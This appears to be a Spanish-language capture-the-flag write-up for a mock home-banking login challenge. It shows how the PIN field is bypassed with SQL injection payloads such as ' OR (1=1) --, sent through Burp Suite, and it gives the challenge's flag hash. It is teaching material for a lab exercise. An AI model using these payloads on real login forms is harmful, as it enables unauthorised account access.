# Desafío 3 - Home Banking

## Análisis

El campo de PIN es vulnerable a SQL Injection. Al cerrar la comilla simple se puede inyectar una condición que siempre sea verdadera, saltando la autenticación.

## Explotación

Se ingresa cualquier valor en el campo PIN (ej. `aa`), se intercepta la petición con Burp Suite y se modifica la línea del PIN por alguno de los siguientes payloads:

```
txtPin=' OR (SELECT 1 FROM usuarios LIMIT 1) -- &btnIngresar=Ingresar
```

```
txtPin=' OR (1=1) -- &btnIngresar=Ingresar
```

**Explicación:**
- La comilla simple `'` cierra la comilla que abre la base de datos.
- `OR (1=1)` agrega una condición que siempre se cumple.
- `--` comenta el resto de la consulta, anulando cualquier validación adicional.

![Desafío 3 - Home Banking - imagen 1](images/01.png)

![Desafío 3 - Home Banking - imagen 2](images/02.png)

![Desafío 3 - Home Banking - imagen 3](images/03.png)

![Desafío 3 - Home Banking - imagen 4](images/04.png)

![Desafío 3 - Home Banking - imagen 5](images/05.png)

## Flag

```
bf58371373e52613ae270d5acf832bad
```
